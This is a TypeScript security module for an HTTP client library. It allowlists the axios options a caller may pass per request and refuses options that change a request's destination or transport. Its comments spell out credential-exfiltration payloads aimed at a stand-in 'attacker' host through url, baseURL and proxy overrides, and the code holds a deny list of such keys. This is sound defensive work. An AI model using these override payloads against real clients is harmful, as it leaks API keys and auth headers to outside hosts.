import type { AxiosRequestConfig } from 'axios';
import { MinderSecurityError } from '../../errors/index.js';

/**
 * fix-2.2.0-blockers (SECURITY, adversarial re-probe round 2 — credential
 * exfiltration, still open after the `urlOverride` fix). `ApiClient
 * .dispatchResolved` used to spread the ENTIRE caller-supplied per-call
 * `options` object (minus `headers`/`method`/`params`/`rawUrl`/`urlOverride`,
 * which are handled separately) straight into the outgoing axios request
 * config — `...otherOptions` — AFTER the RESOLVED, trusted route `url` was
 * already set and the route's own declared headers (e.g. a static
 * `X-Api-Key`) were already merged in. That single unconstrained spread was
 * THREE independent, live-wire-verified exfiltration channels, not one:
 *
 *   1. `{ url: 'http://attacker/exfil' }`      — wins outright: the spread
 *      lands AFTER `url:` in the object literal.
 *   2. `{ baseURL: 'http://attacker' }`        — axios prefixes/redirects
 *      the whole request there.
 *   3. `{ proxy: { host: 'attacker', port } }` — axios CONNECTs through the
 *      given host as an HTTP proxy and hands it the entire absolute-form
 *      request line — method, path, AND headers — even though `url` itself
 *      was never touched.
 *
 * Guarding just `url`/`baseURL`/`proxy` is a DENYLIST and only closes the
 * three channels someone happened to probe. `adapter`, `transformRequest`/
 * `transformResponse`, `httpAgent`/`httpsAgent`, and `socketPath` are the
 * SAME family — each receives (or fully replaces) the assembled config,
 * headers included, and can ship it anywhere — and would simply become next
 * round's finding. This module is deliberately the opposite shape: an
 * ALLOWLIST of the ONLY axios options a per-call caller may influence.
 * Everything else — known-dangerous or simply never vetted — is dropped by
 * construction. A brand new axios option added in some future release is
 * unreachable through this path until someone deliberately adds it to
 * {@link FORWARDABLE_REQUEST_OPTION_KEYS}.
 *
 * What a caller legitimately needs to influence per-request: an
 * abort/cancel handle (`signal`), a per-call timeout override (`timeout`),
 * how the response body is decoded (`responseType`), and upload/download
 * progress callbacks (`onUploadProgress`/`onDownloadProgress` — these only
 * ever receive a progress event, never the request config or headers, so
 * they cannot themselves be used to read or relay a secret header). Destined
 * NEVER to be caller-influenced per-request: the destination
 * (`url`/`baseURL`), the transport mechanism (`proxy`/`adapter`/
 * `httpAgent`/`httpsAgent`/`socketPath`), and anything that can intercept or
 * rewrite the assembled request/response in caller code
 * (`transformRequest`/`transformResponse`/`beforeRedirect`) — those are the
 * library's job alone, and the route registry (not a per-call option bag)
 * is the only place that gets to say where a registered route's own secrets
 * may travel.
 */
export const FORWARDABLE_REQUEST_OPTION_KEYS = [
  'timeout',
  'signal',
  'responseType',
  'onUploadProgress',
  'onDownloadProgress',
  // fix-2.2.0-blockers (ALSO REQUIRED — allowlist/doc reconciliation): these
  // four were previously SILENTLY dropped even though `withCredentials`/
  // `paramsSerializer`/`decompress` are documented axiosConfig keys
  // (docs/FEATURES.md, llms.txt) and every breaking behavior change must be
  // declared (owner mitigation policy — see CHANGELOG.md). Each is safe to
  // forward per-call because NONE of them can change WHERE a request goes or
  // WHAT transport carries it — the only two properties this allowlist
  // exists to keep off this path:
  //   - `withCredentials`: whether the BROWSER attaches ITS OWN existing
  //     cookies to the (already-fixed) destination — it cannot cause a
  //     request to go anywhere new or attach anything the browser wasn't
  //     already going to hold for that origin.
  //   - `validateStatus`: purely local — decides which HTTP status codes
  //     axios treats as success vs. throws for. Never touches the request.
  //   - `paramsSerializer`: purely local — how the ALREADY-VALIDATED `params`
  //     get encoded into a query string. Caller-supplied code, same trust
  //     level as `onUploadProgress`/`onDownloadProgress` above.
  //   - `decompress`: purely local (Node-only) — whether axios auto-inflates
  //     a gzip/deflate response body. Never touches the request.
  'withCredentials',
  'validateStatus',
  'paramsSerializer',
  'decompress',
] as const;

export type ForwardableRequestOptionKey = (typeof FORWARDABLE_REQUEST_OPTION_KEYS)[number];

/**
 * The narrowed shape {@link pickForwardableRequestOptions} returns. Nothing
 * outside this type can reach the outgoing axios config through the per-call
 * `options` bag — not merely "isn't expected to", the return type itself has
 * no other keys.
 */
export type ForwardableRequestOptions = Pick<AxiosRequestConfig, ForwardableRequestOptionKey>;

/**
 * Options that change WHERE a request goes or HOW it is physically
 * transported/intercepted. Explicitly refused with a `MinderSecurityError`
 * — thrown before ANY part of the outgoing request is assembled, so the
 * route's own headers are never combined with anything — rather than
 * silently dropped, so a caller sees exactly why the override had no effect
 * instead of a silent divergence between what they asked for and what
 * dispatched. This list is a courtesy for the specific, demonstrated attack
 * shapes; {@link pickForwardableRequestOptions}'s allowlist is the actual
 * structural guarantee and independently covers everything NOT in
 * {@link FORWARDABLE_REQUEST_OPTION_KEYS}, named here or not.
 */
const ORIGIN_OR_TRANSPORT_OPTION_KEYS = [
  'url',
  'baseURL',
  'proxy',
  'adapter',
  'transformRequest',
  'transformResponse',
  'httpAgent',
  'httpsAgent',
  'socketPath',
  'beforeRedirect',
] as const;

/**
 * Throws a directed `MinderSecurityError` if `options` tries to override any
 * origin-changing or transport-hijacking axios field. Call this BEFORE
 * assembling any part of the outgoing request config.
 */
export function assertNoOriginOrTransportOptions(options: Record<string, unknown>): void {
  const found = ORIGIN_OR_TRANSPORT_OPTION_KEYS.filter((key) => options[key] !== undefined);
  if (found.length > 0) {
    throw new MinderSecurityError(
      `Refused to dispatch a request whose per-call options tried to override ${found
        .map((k) => `"${k}"`)
        .join(', ')} — ${found.length > 1 ? 'these' : 'this'} control WHERE a request is sent or HOW it is ` +
        `physically transported/intercepted, and the resolved route's own headers (including any static ` +
        `auth/API-key header) would otherwise be attached to whatever destination or transport ${found.length > 1 ? 'they supply' : 'it supplies'}. ` +
        `Only the following per-request options are forwarded: ${FORWARDABLE_REQUEST_OPTION_KEYS.join(', ')}. ` +
        `To dispatch through a registered route with a different (same-origin, path-only) URL, use ` +
        `'urlOverride' instead.`,
      'UNSAFE_REQUEST_OPTION_OVERRIDE',
      { rejectedKeys: found }
    );
  }
}

/**
 * The structural guarantee: builds a BRAND NEW object containing ONLY the
 * allowlisted keys present on `options`. Nothing else — dangerous or merely
 * unvetted — can reach the returned object, so nothing else can reach the
 * outgoing axios request config through this path. Call
 * {@link assertNoOriginOrTransportOptions} first so a rejected override
 * throws with a directed message instead of being silently dropped here.
 */
export function pickForwardableRequestOptions(
  options: Record<string, unknown>
): ForwardableRequestOptions {
  const result: Record<string, unknown> = {};
  for (const key of FORWARDABLE_REQUEST_OPTION_KEYS) {
    if (options[key] !== undefined) {
      result[key] = options[key];
    }
  }
  return result as ForwardableRequestOptions;
}

/**
 * The Minder-only, non-axios fields every per-call `options` bag may carry
 * on top of a plain `AxiosRequestConfig` — stripped by
 * {@link extractCallerRequestOptions} before anything axios-shaped is built.
 * `schema` is intentionally untyped here (`unknown`) so this module never
 * needs to import `StandardSchemaV1` — callers cast it back at the point
 * they actually use it (see `ApiClient.request`/`requestRaw`).
 */
export type CallerRequestOptions = AxiosRequestConfig & {
  rawUrl?: boolean;
  urlOverride?: string;
  schema?: unknown;
  /**
   * p-t1-percall-transport-fetch-fingerprint (fix): a per-call transport
   * override — mirrors `minder()`'s own `MinderOptions.transport` (documented,
   * per-call). Previously this fell into `otherOptions` along with every
   * other unknown key, survived `assertNoOriginOrTransportOptions` (it isn't
   * an origin/transport-hijack axios field), then was silently DROPPED by
   * `pickForwardableRequestOptions` because it isn't a real `AxiosRequestConfig`
   * member and was never added to {@link FORWARDABLE_REQUEST_OPTION_KEYS} —
   * so `apiClient.request(name, data, params, { transport: 'fetch' })` had
   * zero effect and silently fell back to the instance's construction-time
   * transport. Destructured out here (like `rawUrl`/`urlOverride`/`schema`)
   * so callers threading it through `dispatchResolved`/`requestRaw` can
   * choose the transport PER CALL instead of only at construction time.
   */
  transport?: 'auto' | 'axios' | 'fetch';
};

/**
 * fix-2.2.0-blockers (item 1, STRUCTURAL FIX — the fourth exfiltration
 * channel): the SINGLE choke point every ApiClient dispatch path uses to go
 * from a caller-supplied, UNTRUSTED per-call `options` bag to the individual
 * fields it is allowed to influence. `assertNoOriginOrTransportOptions` and
 * `pickForwardableRequestOptions` are called from HERE, and ONLY here.
 *
 * Why this closes the class, not just the two known instances (`request`'s
 * `dispatchResolved` and `requestRaw`): after this call, the caller's
 * `options` bag itself is DISCARDED — nothing downstream ever holds a
 * reference to it, or to any `AxiosRequestConfig`-shaped value derived from
 * it, again. The only thing that survives is `forwardable`, whose TYPE
 * (`ForwardableRequestOptions`) has no `url`/`baseURL`/`proxy`/`adapter`/...
 * member AT ALL — `forwardable.url` is `TS2339: Property 'url' does not
 * exist`, not a runtime guard a future dispatch path could simply forget to
 * call (see item 3's compile-error proof in ApiClient.ts). A THIRD dispatch
 * path added later has no type-legal way to hand caller options to axios
 * without routing through this function first, because there is no other
 * place in the module that produces a `ForwardableRequestOptions` value —
 * this is the literal, singular constructor for it. `requestRaw` previously
 * bypassed this entirely with a raw `...otherOptions` spread (the exact
 * shape fixed for the registered-route path 240+ lines away in `request()`)
 * — that duplication, not a missing guard call, was the actual defect: two
 * independent option-handling implementations for the same trust boundary
 * WILL diverge. There is now exactly one.
 */
export function extractCallerRequestOptions(options: CallerRequestOptions | undefined): {
  headers: AxiosRequestConfig['headers'] | undefined;
  method: AxiosRequestConfig['method'] | undefined;
  params: Record<string, unknown> | undefined;
  rawUrl: boolean | undefined;
  urlOverride: string | undefined;
  schema: unknown;
  transport: 'auto' | 'axios' | 'fetch' | undefined;
  forwardable: ForwardableRequestOptions;
} {
  const {
    headers,
    method,
    params,
    rawUrl,
    urlOverride,
    schema,
    transport,
    ...otherOptions
  } = (options || {}) as CallerRequestOptions;

  // Refuse BEFORE anything else — the earliest possible point, before any
  // part of an outgoing request config exists for either dispatch path.
  assertNoOriginOrTransportOptions(otherOptions as Record<string, unknown>);

  return {
    headers,
    method,
    params: params as Record<string, unknown> | undefined,
    rawUrl,
    urlOverride,
    schema,
    transport,
    forwardable: pickForwardableRequestOptions(otherOptions as Record<string, unknown>),
  };
}
